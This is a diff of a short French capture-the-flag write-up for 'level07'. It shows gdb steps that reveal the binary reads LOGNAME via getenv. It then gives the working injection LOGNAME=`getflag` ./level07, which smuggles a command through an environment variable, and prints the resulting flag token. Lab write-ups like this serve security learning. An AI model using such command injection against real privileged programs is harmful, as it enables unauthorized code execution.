@@ -10,14 +10,15 @@
 gdb ./level07
 set disassembly-flavor intel
 info function 
-    -> on voit la fonction getenv qui nous interesse car on peut facilement exploiter l environement
+    -> on voit la fonction getenv qui nous interesse car on peut facilement exploiter l'environement
+    
 break *main; run
     -> 0x0804856f <+91>:	movl   $0x8048680,(%esp)
        0x08048576 <+98>:	call   0x8048400 <getenv@plt>
-    Ces deux lignes nous interesse car cest la variable qu'utilise getenv pour afficher level07
+       Ces deux lignes nous interessent car c'est la variable qu'utilise getenv pour afficher level07
 x/s 0x8048680
-    -> "LOGNAME" du coup facil à exploiter:
+    -> "LOGNAME" du coup facile à exploiter:
 
-- on utilise les modifications d environnememt pour l execution
+- on utilise les modifications d'environnememt pour l'execution
 LOGNAME=`getflag` ./level07
     -> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
